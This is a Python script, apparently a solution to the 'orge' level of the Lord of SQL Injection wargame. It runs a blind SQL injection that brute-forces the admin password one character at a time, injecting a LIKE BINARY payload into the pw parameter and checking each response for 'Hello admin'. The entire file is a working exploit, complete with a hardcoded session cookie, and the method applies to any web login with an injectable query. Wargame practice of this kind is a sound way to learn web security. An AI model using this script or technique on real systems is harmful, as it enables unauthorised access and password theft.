# LordofSQLi: orge
# woanmeo11

import requests
from string import printable

url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
cookies = {'PHPSESSID': 'n3a246mepfklr3jmvbvntarv00'}

passwd = ''
while True:
    finish = True
    for c in printable:
        if c != '%':
            payload = {'pw': f"'|| id='admin' && pw LIKE BINARY '{passwd + c}%'-- "}
            r = requests.get(url, params=payload, cookies=cookies)
            print(c, end='', flush=True)
            if 'Hello admin' in r.text:
                passwd += c
                finish = False
                print('\n->' + passwd)
                break
    if finish:
        break
print(passwd)
